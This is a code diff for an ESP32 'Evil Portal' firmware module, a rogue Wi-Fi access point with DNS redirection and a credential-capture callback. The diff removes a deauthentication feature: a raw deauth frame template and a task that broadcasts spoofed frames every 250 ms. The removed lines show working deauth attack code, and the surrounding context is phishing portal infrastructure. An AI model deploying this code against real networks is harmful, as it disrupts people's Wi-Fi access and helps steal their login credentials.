@@ -19,11 +19,9 @@
 #define TAG "EvilPortal"
 #define DNS_PORT 53
 #define DNS_TASK_STACK 3072
-#define DEAUTH_TASK_STACK 3072
 
 static volatile bool s_running = false;
 static volatile bool s_dns_run = false;
-static volatile bool s_deauth_run = false;
 static bool s_bt_was_on = false;
 static bool s_event_handlers_registered = false;
 
@@ -52,7 +50,6 @@ static void evil_ap_event_handler(void* arg, esp_event_base_t event_base, int32_
     }
 }
 static TaskHandle_t s_dns_task = NULL;
-static TaskHandle_t s_deauth_task = NULL;
 static httpd_handle_t s_http = NULL;
 static esp_netif_t* s_ap_netif = NULL;
 static int s_dns_socket = -1;
@@ -65,15 +62,6 @@ static void* s_cred_cb_ctx = NULL;
 
 static char* s_html_buf = NULL;
 static size_t s_html_len = 0;
-
-static const uint8_t deauth_template[26] = {
-    0xC0, 0x00, 0x00, 0x00,
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00,
-    0x07, 0x00,
-};
 
 static int hex_decode_char(char c) {
     if(c >= '0' && c <= '9') return c - '0';
@@ -505,25 +493,6 @@ static void dns_task(void* arg) {
     vTaskDelete(NULL);
 }
 
-static void deauth_task(void* arg) {
-    (void)arg;
-    uint8_t pkt[26];
-    uint8_t bssid[6];
-    if(esp_wifi_get_mac(WIFI_IF_AP, bssid) != ESP_OK) {
-        memset(bssid, 0, 6);
-    }
-
-    while(s_deauth_run) {
-        memcpy(pkt, deauth_template, sizeof(pkt));
-        memcpy(&pkt[10], bssid, 6);
-        memcpy(&pkt[16], bssid, 6);
-        esp_wifi_80211_tx(WIFI_IF_AP, pkt, sizeof(pkt), false);
-        vTaskDelay(pdMS_TO_TICKS(250));
-    }
-    s_deauth_task = NULL;
-    vTaskDelete(NULL);
-}
-
 typedef struct {
     const WifiHalEvilPortalConfig* cfg;
     bool result;
@@ -534,8 +503,8 @@ static void evil_portal_start_worker(void* arg) {
     const WifiHalEvilPortalConfig* cfg = sa->cfg;
     sa->result = false;
 
-    ESP_LOGI(TAG, "[worker] start: ssid='%s' ch=%u deauth=%d html_len=%u",
-             cfg->ssid, cfg->channel, cfg->deauth_enabled, (unsigned)cfg->html_len);
+    ESP_LOGI(TAG, "[worker] start: ssid='%s' ch=%u html_len=%u",
+             cfg->ssid, cfg->channel, (unsigned)cfg->html_len);
 
     static bool s_netif_done = false;
     if(!s_netif_done) {
@@ -671,12 +640,6 @@ static void evil_portal_start_worker(void* arg) {
         return;
     }
 
-    if(cfg->deauth_enabled) {
-        ESP_LOGI(TAG, "[worker] starting deauth task");
-        s_deauth_run = true;
-        xTaskCreate(deauth_task, "EpDeauth", DEAUTH_TASK_STACK, NULL, 4, &s_deauth_task);
-    }
-
     s_running = true;
     sa->result = true;
 
@@ -688,8 +651,8 @@ static void evil_portal_start_worker(void* arg) {
                  (unsigned)((ip >> 16) & 0xff), (unsigned)((ip >> 24) & 0xff));
     }
 
-    ESP_LOGI(TAG, "[worker] Evil Portal ACTIVE: SSID='%s' Ch=%u Deauth=%d",
-             cfg->ssid, ap_cfg.ap.channel, cfg->deauth_enabled);
+    ESP_LOGI(TAG, "[worker] Evil Portal ACTIVE: SSID='%s' Ch=%u",
+             cfg->ssid, ap_cfg.ap.channel);
 }
 
 bool wifi_hal_evil_portal_start(const WifiHalEvilPortalConfig* cfg) {
@@ -742,12 +705,6 @@ bool wifi_hal_evil_portal_start(const WifiHalEvilPortalConfig* cfg) {
 static void evil_portal_stop_worker(void* arg) {
     (void)arg;
     ESP_LOGI(TAG, "[worker] stopping Evil Portal");
-
-    if(s_deauth_run) {
-        ESP_LOGI(TAG, "[worker]   stopping deauth task");
-        s_deauth_run = false;
-        while(s_deauth_task) vTaskDelay(pdMS_TO_TICKS(10));
-    }
 
     ESP_LOGI(TAG, "[worker]   stopping DNS task");
     s_dns_run = false;
